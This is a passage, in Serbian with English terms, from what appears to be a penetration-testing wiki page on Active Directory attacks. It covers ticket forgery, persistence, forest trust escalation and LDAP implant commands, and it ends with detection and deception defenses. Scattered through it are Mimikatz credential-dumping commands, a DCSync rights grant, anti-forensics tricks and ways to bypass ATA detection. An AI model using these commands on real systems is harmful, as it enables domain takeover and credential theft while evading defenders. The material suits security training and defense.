Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** kreira **legitimate Ticket Granting Service (TGS) ticket** za određeni servis koristeći **NTLM hash** (na primer, **hash PC naloga**). Ova metoda se koristi za **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** podrazumeva da napadač dobije pristup **NTLM hash-u naloga krbtgt** u Active Directory (AD) okruženju. Ovaj nalog je poseban jer se koristi za potpisivanje svih **Ticket Granting Tickets (TGTs)**, koji su neophodni za autentifikaciju unutar AD mreže.

Kada napadač dođe do ovog hash-a, može da napravi **TGTs** za bilo koji nalog koji izabere (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ovo su kao golden tickets napravljeni na način koji **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Imanje certifikata naloga ili mogućnost da ih zatražite** je veoma dobar način da se ostane prisutan u korisničkom nalogu (čak i ako promeni lozinku):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Korišćenje certifikata je takođe moguće za persistence sa visokim privilegijama unutar domena:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Objekat **AdminSDHolder** u Active Directory obezbeđuje sigurnost **privileged groups** (kao što su Domain Admins i Enterprise Admins) primenom standardne **Access Control List (ACL)** preko ovih grupa kako bi se sprečile neovlašćene izmene. Međutim, ova funkcija može da se zloupotrebi; ako napadač izmeni ACL AdminSDHolder-a tako da regularnom korisniku dodeli puni pristup, taj korisnik dobija široku kontrolu nad svim privilegovanim grupama. Ova bezbednosna mera, zamišljena da štiti, može se tako obiti i omogućiti neovlašćen pristup osim ako se pažljivo ne nadgleda.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Unutar svakog **Domain Controller (DC)** postoji nalog **local administrator**. Ako se dobiju admin prava na takvoj mašini, lokalni Administrator hash može da se izvuče pomoću **mimikatz**. Nakon toga je potrebna izmena registry-ja kako bi se **enable the use of this password**, što omogućava udaljeni pristup lokalnom Administrator nalogu.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Možete **give** neka **special permissions** **user-u** nad određenim domain objektima, što će tom korisniku omogućiti da u budućnosti **escalate privileges**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** se koriste za **store** **permissions** koje neki **object** ima **over** neki **object**. Ako možete samo da **make** malu izmenu u **security descriptor**-u nekog objekta, možete dobiti veoma zanimljive privilegije nad tim objektom bez potrebe da budete član privilegovane grupe.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Zloupotrebite `dynamicObject` auxiliary class da biste kreirali kratkotrajne principals/GPOs/DNS zapise sa `entryTTL`/`msDS-Entry-Time-To-Die`; oni se sami brišu bez tombstones, brišući LDAP dokaze dok ostavljaju orphan SID-ove, pokvarene `gPLink` references ili keširane DNS odgovore (npr. AdminSDHolder ACE pollution ili malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Izmenite **LSASS** u memoriji da biste uspostavili **universal password**, što daje pristup svim domain nalozima.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Ovde saznajte šta je SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Možete napraviti svoj **own SSP** da biste **capture**-ovali u **clear text** credentials korišćene za pristup mašini.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registruje **new Domain Controller** u AD i koristi ga da **push attributes** (SIDHistory, SPNs...) na navedene objekte **without** ostavljanja ikakvih **logs** o **modifications**. Potrebne su vam privilegije **DA** i morate biti unutar **root domain**.\
Imajte na umu da će, ako koristite pogrešne podatke, pojaviti se vrlo ružni logovi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Ranije smo govorili o tome kako da eskalirate privilegije ako imate **enough permission to read LAPS passwords**. Međutim, ove lozinke se takođe mogu koristiti za **maintain persistence**.\
Pogledajte:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft posmatra **Forest** kao bezbednosnu granicu. To znači da bi **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) je bezbednosni mehanizam koji omogućava korisniku iz jednog **domain**-a da pristupi resursima u drugom **domain**-u. On suštinski pravi vezu između autentikacionih sistema ta dva domena, omogućavajući da autentikacione provere teku neometano. Kada domeni uspostave trust, oni razmenjuju i čuvaju specifične **keys** u svojim **Domain Controllers (DCs)**, koji su ključni za integritet trust-a.

U tipičnom scenariju, ako korisnik želi da pristupi servisu u **trusted domain**, najpre mora da zatraži poseban ticket poznat kao **inter-realm TGT** od svog DC-a. Ovaj TGT je šifrovan deljenim **key**-em na koji su se oba domena usaglasila. Korisnik zatim predstavi ovaj TGT **DC of the trusted domain** da bi dobio service ticket (**TGS**). Nakon uspešne validacije inter-realm TGT-a od strane DC-a trusted domena, on izdaje TGS, čime korisniku omogućava pristup servisu.

**Koraci**:

1. **Client computer** u **Domain 1** pokreće proces koristeći svoj **NTLM hash** da zatraži **Ticket Granting Ticket (TGT)** od svog **Domain Controller (DC1)**.
2. DC1 izdaje novi TGT ako je client uspešno autentifikovan.
3. Client zatim zahteva **inter-realm TGT** od DC1, koji je potreban za pristup resursima u **Domain 2**.
4. Inter-realm TGT je šifrovan sa **trust key** deljenim između DC1 i DC2 kao deo dvosmernog domain trust-a.
5. Client nosi inter-realm TGT do **Domain 2's Domain Controller (DC2)**.
6. DC2 verifikuje inter-realm TGT koristeći svoj deljeni trust key i, ako je validan, izdaje **Ticket Granting Service (TGS)** za server u Domain 2 kojem client želi da pristupi.
7. Na kraju, client predstavi ovaj TGS serveru, koji je šifrovan hash-om serverovog naloga, da bi dobio pristup servisu u Domain 2.

### Different trusts

Važno je primetiti da trust može biti **1 way** ili **2 ways**. U opciji 2 ways, oba domena veruju jedan drugom, ali u **1 way** trust relaciji jedan domen će biti **trusted** a drugi **trusting** domen. U poslednjem slučaju, **moći ćete da pristupate resursima unutar trusting domena samo iz trusted domena**.

Ako Domain A trust-uje Domain B, A je trusting domen a B je trusted domen. Štaviše, u **Domain A**, ovo bi bio **Outbound trust**; a u **Domain B**, ovo bi bio **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Ovo je uobičajeno podešavanje unutar istog forest-a, gde child domain automatski ima dvosmerni transitive trust sa svojim parent domain-om. Suštinski, to znači da autentikacioni zahtevi mogu neometano da teku između parent i child domena.
- **Cross-link Trusts**: Nazvani i "shortcut trusts", oni se uspostavljaju između child domena kako bi se ubrzao referral proces. U složenim forest-ovima, autentikacioni referral-i obično moraju da putuju do forest root-a i zatim dole do ciljnog domena. Kreiranjem cross-link-ova, putovanje se skraćuje, što je posebno korisno u geografski raspršenim okruženjima.
- **External Trusts**: Ovi se uspostavljaju između različitih, nepovezanih domena i po prirodi su non-transitive. Prema [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts su korisni za pristup resursima u domenu van trenutnog forest-a koji nije povezan forest trust-om. Bezbednost se povećava SID filtering-om kod external trust-ova.
- **Tree-root Trusts**: Ovi trust-ovi se automatski uspostavljaju između forest root domena i novo dodatog tree root-a. Iako se ne susreću često, tree-root trust-ovi su važni za dodavanje novih domain tree-ova u forest, omogućavajući im da zadrže jedinstveno domain ime i obezbeđujući dvosmernu transitive prirodu. Više informacija može se naći u [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ovaj tip trust-a je dvosmerni transitive trust između dva forest root domena, uz dodatno SID filtering radi poboljšanja bezbednosnih mera.
- **MIT Trusts**: Ovi trust-ovi se uspostavljaju sa non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domenima. MIT trust-ovi su malo specijalizovaniji i namenjeni okruženjima koja zahtevaju integraciju sa Kerberos-based sistemima van Windows ekosistema.

#### Other differences in **trusting relationships**

- Trust relationship može takođe biti **transitive** (A trust B, B trust C, then A trust C) ili **non-transitive**.
- Trust relationship može biti postavljen kao **bidirectional trust** (oba veruju jedno drugom) ili kao **one-way trust** (samo jedan od njih trust-uje drugog).

### Attack Path

1. **Enumerate** trusting relationships
2. Proverite da li neki **security principal** (user/group/computer) ima **access** resursima **other domain**, možda preko ACE zapisa ili zato što je u grupama drugog domena. Tražite **relationships across domains** (trust je verovatno zbog ovoga kreiran).
1. kerberoast u ovom slučaju može biti još jedna opcija.
3. **Compromise** **accounts** koji mogu da **pivot**-uju kroz domene.

Napadači sa mogli da pristupe resursima u drugom domenu kroz tri primarna mehanizma:

- **Local Group Membership**: Principals mogu biti dodati u lokalne grupe na mašinama, kao što je grupa “Administrators” na serveru, što im daje značajnu kontrolu nad tom mašinom.
- **Foreign Domain Group Membership**: Principals takođe mogu biti članovi grupa unutar foreign domena. Međutim, efikasnost ovog metoda zavisi od prirode trust-a i opsega grupe.
- **Access Control Lists (ACLs)**: Principals mogu biti navedeni u **ACL**, posebno kao entiteti u **ACEs** unutar **DACL**, čime dobijaju pristup određenim resursima. Za one koji žele dublje da uđu u mehaniku ACL-ova, DACL-ova i ACE-ova, whitepaper pod nazivom “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” je neprocenjiv resurs.

### Find external users/groups with permissions

Možete proveriti **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** da biste pronašli foreign security principals u domenu. To će biti user/group iz **an external domain/forest**.

Ovo možete proveriti u **Bloodhound** ili koristeći powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Eskalacija privilegija iz child u parent forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Drugi načini za enumeraciju domain trustova:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Postoje **2 trusted keys**, jedna za _Child --> Parent_ i druga za _Parent_ --> _Child_.\
> Možete proveriti onu koju koristi trenutni domain pomoću:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate kao Enterprise admin do child/parent domain abuse-ovanjem trust-a sa SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Razumevanje kako se Configuration Naming Context (NC) može exploit-ovati je ključno. Configuration NC služi kao centralno spremište za configuration podatke kroz forest u Active Directory (AD) okruženjima. Ovi podaci se repliciraju na svaki Domain Controller (DC) unutar forest-a, pri čemu writable DCs održavaju writable kopiju Configuration NC. Da bi se ovo exploit-ovalo, potrebno je imati **SYSTEM privileges na DC**, po mogućstvu child DC.

**Link GPO to root DC site**

Configuration NC Sites container sadrži informacije o sajtovima svih računara pridruženih domain-u unutar AD forest-a. Radeći sa SYSTEM privileges na bilo kom DC-u, napadači mogu povezati GPOs sa root DC sajtovima. Ova akcija potencijalno kompromituje root domain manipulisanjem policy-ja primenjenim na ove sajtove.

Za detaljne informacije, može se proučiti research o [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Jedan attack vector uključuje targetiranje privilegovanih gMSAs unutar domain-a. KDS Root key, neophodan za izračunavanje gMSAs passworda, čuva se unutar Configuration NC. Sa SYSTEM privileges na bilo kom DC-u, moguće je pristupiti KDS Root key i izračunati passworde za bilo koji gMSA kroz forest.

Detaljna analiza i step-by-step guidance mogu se naći u:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Komplementarni delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatni external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Ovaj metod zahteva strpljenje, čekanje na kreiranje novih privilegovanih AD objekata. Sa SYSTEM privileges, napadač može modifikovati AD Schema da dodeli bilo kom user-u potpunu kontrolu nad svim class-ovima. Ovo može dovesti do unauthorized access i kontrole nad novokreiranim AD objektima.

Dalje čitanje je dostupno na [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability targetira kontrolu nad Public Key Infrastructure (PKI) objektima radi kreiranja certificate template-a koji omogućava authentication kao bilo koji user unutar forest-a. Pošto se PKI objekti nalaze u Configuration NC, kompromitovanje writable child DC omogućava izvršavanje ESC5 attacks.

Više detalja o ovome može se pročitati u [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). U scenarijima bez ADCS-a, napadač ima mogućnost da podesi neophodne komponente, kao što je opisano u [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
U ovom scenariju **vaš domen je trusted** od strane eksternog, što vam daje **neodređene permissions** nad njim. Moraćete da pronađete **koji principals vašeg domena imaju koji access nad eksternim domenom** i zatim pokušate da to exploit-ujete:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
U ovom scenariju **vaš domain** **dodeljuje** neke **privileges** principalu iz **drugih domains**.

Međutim, kada **trusting domain** **veruje** trusted domain-u, trusted domain **kreira usera** sa **predvidivim imenom** koji kao **password koristi trusted password**. To znači da je moguće **pristupiti useru iz trusting domain** da biste ušli u trusted domain, enumerisali ga i pokušali da eskalirate još više privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Još jedan način da kompromitujete trusted domain je da pronađete [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) kreiran u **suprotnom smeru** od domain trust-a (što nije baš uobičajeno).

Još jedan način da kompromitujete trusted domain je da sačekate na mašini kojoj **user iz trusted domain** može da pristupi i prijavi se preko **RDP**. Zatim bi attacker mogao da injektuje code u proces RDP session-a i odatle **pristupi izvornom domain-u victime**.\
Takođe, ako je **victim montirao svoj hard drive**, iz **RDP session** procesa attacker može da sačuva **backdoor-e** u **startup folder** na hard drive-u. Ova tehnika se zove **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ublažavanje abuse-a domain trust-a

### **SID Filtering:**

- Rizik od attacks koji koriste SID history atribut kroz forest trust-ove ublažava se SID Filtering-om, koji je po default-u aktiviran na svim inter-forest trust-ovima. Ovo se zasniva na pretpostavci da su intra-forest trust-ovi sigurni, pri čemu se forest, a ne domain, smatra bezbednosnom granicom, u skladu sa Microsoft-ovim stavom.
- Međutim, postoji caka: SID filtering može da poremeti applications i user access, što ponekad dovodi do njegovog isključivanja.

### **Selective Authentication:**

- Za inter-forest trust-ove, korišćenje Selective Authentication obezbeđuje da user-i iz dva forest-a nisu automatski authenticated. Umesto toga, potrebne su eksplicitne permissions da bi user-i pristupili domains i servers unutar trusting domain-a ili forest-a.
- Važno je napomenuti da ove mere ne štite od exploitation-a writable Configuration Naming Context (NC) ili attacks na trust account.

[**Više informacija o domain trusts u ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) reimplements bloodyAD-style LDAP primitives kao x64 Beacon Object Files koji rade potpuno unutar on-host implant-a (npr. Adaptix C2). Operateri kompajliraju paket sa `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, učitavaju `ldap.axs`, a zatim pozivaju `ldap <subcommand>` iz beacon-a. Sav saobraćaj ide preko trenutnog logon security context-a kroz LDAP (389) sa signing/sealing ili LDAPS (636) sa automatskim trust-ovanjem certificate-a, tako da nisu potrebni socks proxies niti disk artifacts.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, i `get-groupmembers` razrešavaju kratka imena/OU path-ove u pune DN-ove i prikazuju odgovarajuće objekte.
- `get-object`, `get-attribute`, i `get-domaininfo` preuzimaju proizvoljne attributes (uključujući security descriptors) plus forest/domain metadata iz `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, i `get-rbcd` otkrivaju roasting candidates, delegation settings, i postojeće [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors direktno iz LDAP-a.
- `get-acl` i `get-writable --detailed` parsiraju DACL da bi izlistali trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), i inheritance, dajući trenutne targete za ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) omogućavaju operatoru da postavi nove principale ili naloge mašina gde god postoje OU prava. `add-groupmember`, `set-password`, `add-attribute`, i `set-attribute` direktno preuzimaju ciljeve kada se pronađu prava za pisanje svojstava.
- Komande fokusirane na ACL, kao što su `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, i `add-dcsync`, prevode WriteDACL/WriteOwner nad bilo kojim AD objektom u resetovanja lozinki, kontrolu članstva u grupama, ili DCSync replikaiona prava bez ostavljanja PowerShell/ADSI tragova. `remove-*` ekvivalenti čiste injektovane ACE zapise.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` trenutno čine kompromitovanog korisnika Kerberoastable; `add-asreproastable` (UAC toggle) označava ga za AS-REP roasting bez diranja lozinke.
- Delegation makroi (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) prepisuju `msDS-AllowedToDelegateTo`, UAC zastavice, ili `msDS-AllowedToActOnBehalfOfOtherIdentity` iz beacon-a, omogućavajući constrained/unconstrained/RBCD napadne puteve i eliminišući potrebu za remote PowerShell ili RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` injektuje privilegovane SID-ove u SID history kontrolisanog principala (vidi [SID-History Injection](sid-history-injection.md)), obezbeđujući prikriveno nasledno pristupanje potpuno preko LDAP/LDAPS.
- `move-object` menja DN/OU za računare ili korisnike, omogućavajući napadaču da vuče resurse u OU gde delegirana prava već postoje pre nego što zloupotrebi `set-password`, `add-groupmember`, ili `add-spn`.
- Usko obuhvaćene komande za uklanjanje (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, itd.) omogućavaju brzo vraćanje stanja nakon što operator prikupi kredencijale ili persistence, uz minimalnu telemetriju.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Saznajte više o tome kako da zaštitite kredencijale ovde.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Preporučuje se da Domain Admins mogu da se prijavljuju samo na Domain Controllers, kako bi se izbegla njihova upotreba na drugim hostovima.
- **Service Account Privileges**: Servisi ne bi trebalo da se pokreću sa Domain Admin (DA) privilegijama radi očuvanja bezbednosti.
- **Temporal Privilege Limitation**: Za zadatke koji zahtevaju DA privilegije, njihovo trajanje treba ograničiti. Ovo se može postići pomoću: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Auditirajte Event ID-jeve 2889/3074/3075 i zatim uvedite LDAP signing plus LDAPS channel binding na DC-jevima/klijentima da blokirate LDAP MITM/relay pokušaje.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

Ako želite da detektujete uobičajen AD tradecraft, **ne oslanjajte se samo na artefakte pod kontrolom operatora** kao što su preimenovani binari, nazivi servisa, privremeni batch fajlovi ili output putanje. Napravite baseline za to kako legitimni Windows klijenti grade [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, i WMI saobraćaj, a zatim tražite **implementacijske posebnosti** koje ostaju čak i nakon što operator izmeni `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, ili `ntlmrelayx.py`.

- **High-confidence standalone candidates** (nakon validacije protiv vašeg baseline-a):
- Autentifikovani DCE/RPC koristeći `auth_context_id = 79231 + ctx_id`
- DCE/RPC autentifikacioni padding popunjen sa `0xff`
- LDAP Kerberos binds koji direktno stavljaju sirovi Kerberos `AP-REQ` u SPNEGO `mechToken`
- SMB2/3 negotiate zahtevi sa `ClientGuid` vrednostima koje liče na ASCII
- WMI `IWbemLevel1Login::NTLMLogin` koristeći nestandardni namespace `//./root/cimv2`
- Hardcoded Kerberos nonce vrednosti
- **Better as correlation/scoring features**:
- Retki ili duplirani Kerberos etype listovi, neuobičajen/nedostajući `PA-DATA`, ili TGS-REQ etype redosled koji se razlikuje od nativnog Windows-a
- NTLM Type 1 poruke bez version info ili Type 3 poruke sa null host imenima
- Sirovi NTLMSSP nošen u DCE/RPC umesto u SPNEGO, nedostajući DCE/RPC verification trailers, ili SPNEGO/Kerberos OID mismatch-evi
- Nekoliko ovih osobina sa istog hosta/korisnika/session/time window-a su mnogo jače od bilo kog pojedinačnog slabog polja
- **Use as enrichment, not as standalone alerts**:
- Podrazumevani nazivi fajlova, output putanje, nasumični nazivi servisa, privremeni batch nazivi, podrazumevani nazivi naloga računara, i tool-specifični HTTP/WebDAV/RDP/MSSQL stringovi
- Ovo je lako promeniti i najbolje ih je koristiti da objasne zašto je cross-protocol klaster sumnjiv
- **Operational notes**:
- Neki od ovih signala zahtevaju dekriptovan saobraćaj, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, ili vidljivost sa servisne strane
- Validirajte protiv Samba/Linux klijenata, appliance uređaja, i legacy softvera pre nego što ih promovišete u alerte
- Promovišite detekcije od enrichment -> hunting -> alerting kako gradite poverenje u baseline

### **Implementing Deception Techniques**

- Implementiranje deception-a podrazumeva postavljanje zamki, poput lažnih korisnika ili računara, sa funkcijama kao što su lozinke koje ne ističu ili oznaka Trusted for Delegation. Detaljniji pristup uključuje kreiranje korisnika sa specifičnim pravima ili njihovo dodavanje u grupe sa visokim privilegijama.
- Praktičan primer uključuje korišćenje alata kao što su: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Više o implementaciji deception tehnika možete pronaći na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Sumnjivi indikatori uključuju atipičan ObjectSID, retke prijave, datume kreiranja, i nizak broj bad password count.
- **General Indicators**: Poređenje atributa potencijalnih decoy objekata sa atributima pravih može otkriti nedoslednosti. Alati kao što je [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogu pomoći u identifikaciji ovakvih deception-a.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Izbegavanje enumeracije sesija na Domain Controllers da bi se sprečila ATA detekcija.
- **Ticket Impersonation**: Korišćenje **aes** ključeva za kreiranje tiketa pomaže da se izbegne detekcija tako što se ne prelazi na NTLM.
- **DCSync Attacks**: Preporučuje se izvršavanje sa ne- Domain Controller-a da bi se izbegla ATA detekcija, jer će direktno izvršavanje sa Domain Controller-a izazvati alerte.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)

{{#include ../../banners/hacktricks-training.md}}
